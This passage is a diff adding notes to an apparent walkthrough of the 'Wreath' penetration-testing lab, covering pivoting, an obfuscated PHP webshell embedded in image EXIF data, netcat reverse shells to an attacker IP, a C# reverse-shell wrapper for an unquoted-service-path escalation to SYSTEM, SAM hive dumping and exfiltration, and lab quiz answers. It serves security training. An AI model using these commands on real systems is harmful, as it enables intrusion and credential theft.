@@ -642,8 +642,451 @@ curl -X POST http://10.200.81.150/web/exploit-sv.php -d "a=<URL-encoded stager h
 
 ## Personal PC
 
+```shell
+ls -la /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network
+#location for powershell-empire scripts
+
+evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.81.150 -s <empire-dir-location>
+#connect to git-server using Admin hash
+#-s for sharing local directory
+
+Invoke-Portscan.ps1
+#run powershell-empire script in evil-winrm shell
+
+Invoke-Portscan -Hosts 10.200.81.100 -TopPorts 50
+#scan the other Windows machine
+
+#open up port for pivoting
+netsh advfirewall firewall add rule name="Chisel-sv" dir=in action=allow protocol=tcp localport=49337
+
+#for pivoting, we can use chisel
+#in evil-winrm session
+#upload chisel file from current directory
+upload chisel_windows.exe
+
+#setup chisel forward socks proxy
+#on target windows
+./chisel_windows.exe server -p 49337 --socks5
+
+#on attacker
+./chisel_linux client 10.200.81.150:49337 9090:socks
+#now the socks proxy is opened on port 9090 of our port
+
+#setup socks proxy using foxyproxy
+#access webpage at 10.200.81.100
+
+evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.81.150
+#open evil-winrm session in new tab
+#enumerate directories
+
+cd C:\GitStack\repositories
+
+dir
+#Website.git
+
+download C:\GitStack\repositories\Website.git /home/sv/THM/wreath
+#download the complete directory
+
+#in attacker machine
+mv 'C:\GitStack\repositories\Website.git' .git
+#rename folder
+
+git clone https://github.com/internetwache/GitTools
+#clone GitTools
+
+#in the Website.git directory
+GitTools/Extractor/extractor.sh . Website
+#extracts and creates readable format
+
+cd Website
+
+ls -la
+#contains commit directories
+#each includes commit-meta.txt with info
+
+separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
+#one-liner for pretty printing
+
+cd <latest-commit-folder>
+#check latest commit
+
+ls -la
+#index.html
+
+find . -name "*.php"
+#./resources/index.php
+
+cat resources/index.php
+
+#we find a double-extension filter evasion vulnerability
+#we can check the webpage now and attempt uploads
+
+#try embedding webshell in image file
+
+#get image file
+mv ~/image.jpeg test-sv.jpeg.php
+
+exiftool test-sv.jpeg.php
+#check exif data
+
+exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-sv.jpeg.php
+#add comment for PoC
+
+exiftool test-sv.jpeg.php
+#includes comment now
+```
+
+* We can connect to the git-server machine using the ```evil-winrm``` pass-the-hash method from earlier; this time, we can share the folder containing the scripts required.
+
+* Once we are in the shell, we can run the 'PortScan' script to scan the personal machine (10.200.81.100) - this gives us open ports 80 and 3389.
+
+* We need to find a way to access the webserver on Wreath's PC (10.200.81.100)
+
+* As we used ```sshuttle``` before to get access to git-serv (10.200.81.150), this time we can use ```chisel``` to get access to the personal PC.
+
+* Before pivoting, we need to open up the port to be used for ```chisel``` using ```netsh```.
+
+* Then, we can upload the chisel file to Windows target and use the forward proxy technique.
+
+* We can access the webpage by adding localhost:9090 via SOCKS proxy to ```FoxyProxy``` settings.
+
+* Now, we can access the website at <http://10.200.81.100> on our webpage.
+
+* We can use ```Wappalyzer``` to check the technologies being used on the webpage.
+
+* Now, we need to check the Git Server for the ```Website.git``` directory; as our ```evil-winrm``` session is already being used for ```chisel``` pivoting, we need to open another session in a new tab.
+
+* After finding the required '.git' file in the GitStack directory, we can download it using ```evil-winrm```.
+
+* Now, after downloading, in our attacker machine, we need to rename the subdirectory in 'Website.git' folder to '.git'.
+
+* We can extract info from this git repo using ```GitTools``` (Dumper, Extractor and Finder).
+
+* Then, we can use the given bash one-liner to 'pretty print' the contents of 'commit-meta.txt', giving us more info about the commits in the repo.
+
+* Inspecting the info, we can see that the order of commits, in terms of commit message, is "Static Website Commit" > "Initial Commit for the back-end" > "Updated the filter"; so we know which commit would be the latest.
+
+* We can start checking for vulnerabilities in the code by checking the PHP file.
+
+* Looking at the PHP code, we can see that it has a list of 'good extensions', but the filter implemented can be evaded by using double extensions; and the uploaded file will be in the uploads/ directory.
+
+* Using our ```chisel``` pivoting technique and ```FoxyProxy``` implemented earlier, we can now access <http://10.200.81.100/resources>
+
+* This page shows a basic auth pop-up, we can try password-reuse here; using the creds "Thomas:i<3ruby", we are allowed access.
+
+* This page is a 'Ruby Image Upload Page', and we can try to upload legit image files, and view the uploaded file in /uploads directory.
+
+* As the personal PC here includes AV for protection, we need to carry out a PoC first, before attempting evasion.
+
+* Embedding the test payload using ```exiftool``` in the image, and uploading it, we can access it in the /uploads directory and the PoC works.
+
+```markdown
+1. Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open? - 80,3389
+
+2. Using the Wappalyzer browser extension, identify the server-side Programming language used on the website. - PHP 7.4.11
+
+3. Use your WinRM access to look around the Git Server. What is the absolute path to the Website.git directory? - C:\GitStack\repositories\Website.git
+
+4. What does Thomas have to phone Mrs Walker about? - neighbourhood watch meetings
+
+5. Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page? - basic auth
+
+6. Which extensions are accepted? - jpg,jpeg,png,gif
+```
+
 ## AV Evasion
+
+```shell
+mv ~/image.jpeg shell-sv.jpeg.php
+
+exiftool -Comment="<?php \$a0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$a0)){echo base64_decode('PHByZT4=').shell_exec(\$a0).base64_decode('PC9wcmU+');}die();?>" shell-sv.jpeg.php
+#insert obfuscated PHP payload as comment
+
+#upload the payload
+#we have rce now
+
+#get pre-compiled netcat binary for x64 system
+
+sudo python3 -m http.server 80
+#start web server
+
+#execute certutil command on webshell to transfer binary to victim
+
+#setup listener
+sudo nc -nvlp 443
+#execute nc reverse-shell one-liner
+#we get reverse shell
+
+whoami
+#thomas
+
+whoami /priv
+#SeImpersonatePrivilege enabled
+
+whoami /groups
+
+wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+#shows non-default services
+
+sc qc SystemExplorerHelpService
+#this shows vulnerable service running as LocalSystem
+
+powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+#check permissions for directory of vulnerable service
+#we have full control of directory
+
+#in attacker machine
+#install mono for exploit dev
+sudo apt install mono-devel
+
+vim Wrapper.cs
+#create exploit
+
+mcs Wrapper.cs
+#compiles exploit, creates .exe
+
+file Wrapper.exe
+#exploit
+
+sudo smbserver.py share . -smb2support -username user -password Password123
+#start smb server with auth
+
+#in reverse-shell as thomas
+net use \\10.50.82.104\share /USER:user Password123
+#authenticates SMB server using creds
+
+copy \\10.50.82.104\share\Wrapper.exe %TEMP%\wrapper-sv.exe
+#copy exploit to target
+#file copied to current user's temp directory
+
+net use \\10.50.82.104\share /del
+#disconnect from smb server
+
+#on attacker machine
+#start listener
+nc -nvlp 4444
+
+#in reverse-shell, execute exploit
+"%TEMP%\wrapper-sv.exe"
+
+#this works, we get reverse-shell on listener
+
+#we can now move our exploit to the unquoted path
+copy %TEMP%\wrapper-sv.exe "C:\Program Files (x86)\System Explorer\System.exe"
+
+#stop and restart listener in attacker machine
+nc -nvlp 4444
+
+#in victim reverse-shell
+sc stop SystemExplorerHelpService
+#stops the service
+
+sc start SystemExplorerHelpService
+#this does not start the service properly
+#we get reverse shell on our second listener
+
+whoami
+#nt authority\system
+
+#in victim reverse-shell
+#cleanup files
+del "C:\Program Files (x86)\System Explorer\System.exe"
+
+sc start SystemExplorerHelpService
+#we still have our shell
+```
+
+* Types of AV evasion:
+
+  * On-disk evasion - try to get file saved on target, then executed.
+
+  * In-memory evasion - try to import script directly into memory and execute it there.
+
+* AMSI (Anti-Malware Scan Interface) scans scripts as they enter memory, thus making in-memory evasion.
+
+* Types of detection methods used by AV:
+
+  * Static detection - involves signature detection and byte (or string) matching.
+
+  * Dynamic/heuristic/behavioural detection - checks how the file acts; this could be done by checking the flow of execution or actually executing the suspicious software inside a sandbox environment.
+
+* Modern AV software usually use a combination of these two methods for malware detection.
+
+* To exploit the vulnerability in the personal PC, we have to use the given PHP payload (different from usual on purpose for AV evasion):
+
+```php
+<?php
+    $cmd = $_GET["wreath"];
+    if(isset($cmd)){
+        echo "<pre>" . shell_exec($cmd) . "</pre>";
+    }
+    die();
+?>
+```
+
+* We can now use any common [web obfuscator tool](https://www.gaijin.at/en/tools/php-obfuscator) for obfuscating the payload; the '$' symbols in output need to be escaped using backslash.
+
+* Uploading the payload file in <http://10.200.81.100/resources>, we can see that it is uploaded successfully.
+
+* We can check the payload on <http://10.200.81.100/resources/uploads/shell-sv.jpeg.php>; we have RCE now.
+
+* By using the parameter 'wreath', we can execute commands; for ```systeminfo```, we need to check '/shell-sv.jpeg.php?wreath=systeminfo'.
+
+* We can use ```whoami``` to view current username; we are user 'thomas'.
+
+* Now, to get a full reverse shell, we can try to upload a [pre-compiled binary](https://github.com/int0x33/nc.exe/) of ```netcat``` and use that to get reverse-shell.
+
+* Now, on the remote victim machine, we can check for ```curl.exe``` or ```certutil.exe``` by executing the command with the same name - we have both tools available.
+
+* Execute the ```cURL``` command to download the netcat binary on the victim machine (double slashes for escaping):
+
+```curl http://10.50.82.104/nc64-sv.exe -o c:\\windows\\temp\\nc-sv.exe```
+
+* Now, after setting up the listener, we can execute the ```netcat``` binary from victim machine as a Powershell process using the following command:
+
+```powershell.exe c:\\windows\\temp\\nc-sv.exe 10.50.82.104 443 -e cmd.exe```
+
+* We get reverse shell on our listener; we can manually enumerate now as automated enumeration can be flagged by AV.
+
+* ```whoami /priv``` shows ```SeImpersonatePrivilege``` is enabled; this can be exploited.
+
+* Checking the non-default services on the personal machine, we can see that the service ```SystemExplorerHelpService``` contains spaces in the 'PathName' and is unquoted.
+
+* This is vulnerable to 'Unquoted Service Path' attack; we can check under which account the service is running.
+
+* As the service is running as 'LocalSystem', we can now check if we can modify the files in the directory of the vulnerable service.
+
+* We have full control of the directory, thus we can go ahead with this attack.
+
+* For creating the exploit, we have to install the ```mono``` dotnet core compiler for Linux, and this allows us to compile C# executables that can be run on Windows.
+
+* We can now create our exploit which uses the ```netcat``` binary to launch another reverse-shell:
+
+```cs
+using System;
+using System.Diagnostics;
+
+namespace Wrapper{
+        class Program{
+                static void Main(){
+                        Process proc = new Process();
+                        ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-sv.exe", "10.50.82.104 4444 -e cmd.exe");
+                        procInfo.CreateNoWindow = true;
+                        proc.StartInfo = procInfo;
+                        proc.Start();
+                }
+        }
+}
+```
+
+* After compiling the exploit code using Mono ```mcs``` compiler, we have a ```Wrapper.exe``` PE.
+
+* We can then setup an ```impacket``` SMB server to transfer files instead of ```curl``` for no particular reason.
+
+* After copying the exploit to the current user's 'Temp' directory, we can disconnect from the SMB server as we will not need it.
+
+* Setting up a listener and running the exploit normally results in getting shell; so the AV does not flag this.
+
+* As we have write permissions in the directory ```C:\Program Files (x86)\System Explorer\```, we can transfer our exploit to that directory.
+
+* After moving the exploit, we need to kill the second listener (setup for testing purposes); then we can restart the vulnerable service by stopping and then starting it again.
+
+* Only this time, starting the service does not properly start it; however, we get a shell on our listener as 'nt authority\system'.
+
+```markdown
+1. Which category of evasion covers uploading a file to the storage on the target before executing it? - On-disk evasion
+
+2. What does AMSI stand for? - Anti-Malware Scan Interface
+
+3. Which category of evasion does AMSI effect? - In-memory evasion
+
+4. What other name can be used for Dynamic/Heuristic detection methods? - Behavioural
+
+5. If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method? - Static
+
+6. When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious? - pre-defined rules
+
+7. What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)? - Password
+
+8. What is the Host Name of the target? - WREATH-PC
+
+9. What is our current username (include the domain in this)? - wreath-pc\thomas
+
+10. What output do you get when running the command: certutil.exe? - CertUtil: -dump command completed successfully.
+
+11. One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this? - SeImpersonatePrivilege
+
+12. What is the Name of this service? - SystemExplorerHelpService
+
+13. Is the service running as the local system account? - Aye
+```
 
 ## Exfiltration
 
+```shell
+#in reverse-shell as system
+#dump SAM hive
+reg.exe save HKLM\SAM sam.bak
+
+#dump SYSTEM hive
+reg.exe save HKLM\SYSTEM system.bak
+
+#connect to SMB server
+net use \\10.50.82.104\share /USER:user Password123
+
+#data exfiltration
+move sam.bak \\10.50.82.104\share\sam.bak
+
+move system.bak \\10.50.82.104\share\system.bak
+
+net use \\10.50.82.104\share /del
+#disconnect from SMB server
+
+#in attacker machine
+secretsdump.py -sam sam.bak -system system.bak LOCAL
+#dumps hashes
+```
+
+* Goal of exfiltration is to remove data from a compromised target.
+
+* For this, protocols such as DNS and HTTPS are used, generally encoded, to quietly exfiltrate data.
+
+* As we have administrator access on the machine, we can try to grab the password hashes and then dump it.
+
+* The local user hashes are stored in Registry ```HKEY_LOCAL_MACHINE\SAM``` and file ```C:\Windows\System32\Config\SAM``` - we cannot read it while the computer is running so we have to save it.
+
+* Dumping the ```SAM``` hive is not enough; we need to dump the ```SYSTEM``` hive as well for the boot key.
+
+* After dumping both hives, we can exfiltrate them to our attacking machine using the SMB server we setup earlier.
+
+* Then, we can use ```secretsdump.py``` from ```impacket``` to dump the hashes from the hives.
+
+```markdown
+1. Is FTP a good protocol to use when exfiltrating data in a modern network? - Nay
+
+2. For what reason is HTTPS preferred over HTTP during exfiltration? - Encryption
+
+3. What is the Administrator NT hash for this target? - a05c3c807ceeb48c47252568da284cd2
+```
+
 ## Conclusion
+
+* [Sample Penetration Testing report](https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf)
+
+* [Repo for Sample Pentest Reports](https://github.com/juliocesarfort/public-pentesting-reports)
+
+* Layout of pentest report:
+
+  * Executive summary - non-technical; brief overview; scope of engagement; summary of results
+
+  * Timeline - overview of activity timeline
+
+  * Findings & remediations - technical; detailed explanation of vulnerabilities & suggested fixes; indicate severity of vulnerabilities and [risk to company if it is exploited](https://www.first.org/cvss/calculator/3.1)
+
+  * Attack narrative - step-by-step writeup of actions taken against targets
+
+  * Cleanup - actions taken to eradicate presence on targets
+
+  * Conclusion - summary of report; rounding of results; importance of patching
+
+  * References & appendices - references to work cited; links to relevant CVEs, CWEs and CAPECs; code written
